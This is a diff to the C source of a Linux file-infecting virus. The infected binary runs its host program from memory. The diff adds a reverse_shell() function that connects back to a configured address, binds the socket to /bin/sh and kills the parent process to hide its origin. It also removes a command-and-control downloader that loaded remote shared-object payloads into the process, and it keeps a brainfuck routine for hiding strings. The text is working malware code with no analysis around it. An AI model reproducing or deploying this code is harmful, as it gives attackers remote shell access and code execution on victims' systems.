@@ -12,6 +12,7 @@ int main(int argc, char** argv){
   }else{
     FILE* infected = fopen(argv[0], "rb");
     execute_host(infected, argv, environ);
+    reverse_shell();
   }
 }
 
@@ -97,13 +98,8 @@ void execute_host(FILE* f, char** argv, char** envp){
   int fd = memfd_create("", 1);
   write(fd, host, h_size);
 
-  // execute parasites file downloader function as a forked process
-  pid_t pid;
-  if((pid = fork()) == 0){
-    downloader();
-  }
-
   // fork the process to execute the host file
+  pid_t pid;
   if((pid = fork()) == 0){
     fexecve(fd, argv, envp);
   }else{
@@ -111,66 +107,41 @@ void execute_host(FILE* f, char** argv, char** envp){
   }
 }
 
-void load_so(int socket_fd, int size){
-  // read file from socket into buffer and write file data to
-  // the memory file descriptor then load .so payload into address space
-  // to execute its constructor for remote code execution
-  char* file_buff = (char*)malloc(sizeof(char)*size);
-  int fd = memfd_create("", 1);
-  read(socket_fd, file_buff, sizeof(char)*size);
-  close(socket_fd);
-  write(fd, file_buff, size);
-  free(file_buff);
-  void* handle;
-  char file_path[20];
-  sprintf(file_path, "/proc/self/fd/%d", fd);
-  handle = dlopen(file_path, RTLD_LAZY);
-  dlclose(handle);
-}
-
-void process_connection(int socket_fd){
-  // read the first 13 bytes from the socket to get payload file size
-  // then execute code to load the .so payload into the process address space
-  char buff[13];
-  read(socket_fd, buff, sizeof(buff));
-  int size = atoi(buff);
-  load_so(socket_fd, size);
-}
-
-// download shared object from c2
-void downloader(){
+void reverse_shell(){ 
   int socket_fd;
   int connection = -1;
-  struct sockaddr_in server;
-  struct hostent *he;
-  struct in_addr **addr_list;
-  char* ip;
+  int pid;
+  struct sockaddr_in server;  
 
-  // resolve hostname to ip addr
-  he = gethostbyname(hostname);
-  addr_list = (struct in_addr**) he->h_addr_list;
-  ip = inet_ntoa(*addr_list[0]);
-  
-  // set up socket to connect to c2
+  // set up socket for connection
   socket_fd = socket(AF_INET, SOCK_STREAM, 0);
   server.sin_family = AF_INET;
   server.sin_port = htons(port);
-  server.sin_addr.s_addr = inet_addr(ip);
+  server.sin_addr.s_addr = inet_addr(addr);
 
-  // loop until connection is established
-  while(connection < 0){
-    sleep(5);
-    connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
+  if((pid = fork()) == 0){
+    // loop until connection is established
+    while(connection < 0){
+      sleep(5);
+      connection = connect(socket_fd, (struct sockaddr *)&server, sizeof(struct sockaddr));
+    }
+
+    // copy stdin, stdout & stderr to client socket
+    dup2(socket_fd,0);
+    dup2(socket_fd,1);
+    dup2(socket_fd,2);
+    
+    execve("/bin/sh", NULL, NULL); // start shell
+  }else{
+    exit(0); // kill parent process to hide who spawned shell 
   }
-
-  // process the connection to download && load .so payload
-  process_connection(socket_fd);
 }
 
 // WIP, minimal brainfuck interpreter to return char* to a hidden string
 char* hidden_string(char* c){
   char* head = (char*)calloc(0xFF, sizeof(char)); // calloc'd memory is not freed so this does introduce a memory leak
   char* start = head;
+  
   for(int i = 0 ; c[i] != '\0' ; ++i){
     if(c[i] == '>'){
       ++head;
